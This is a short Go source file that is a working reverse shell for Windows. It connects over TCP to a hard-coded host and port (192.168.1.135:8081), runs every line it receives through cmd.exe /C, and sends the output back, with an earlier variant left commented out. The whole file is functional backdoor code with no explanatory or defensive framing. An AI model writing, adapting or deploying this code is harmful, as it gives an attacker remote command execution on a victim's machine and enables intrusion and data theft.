package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, _ := net.Dial("tcp", "192.168.1.135:8081")
	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')

		//out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		//if err != nil {
		//	fmt.Fprintf(conn, "%s\n", err)
		//}

		out, err := exec.Command("cmd.exe", "/C", strings.TrimSpace(message)).Output()
		if err != nil {
			fmt.Fprintf(conn, "Error executing command: %s\n", err)
			continue
		}

		fmt.Fprintf(conn, "%s\n", out)

	}
}
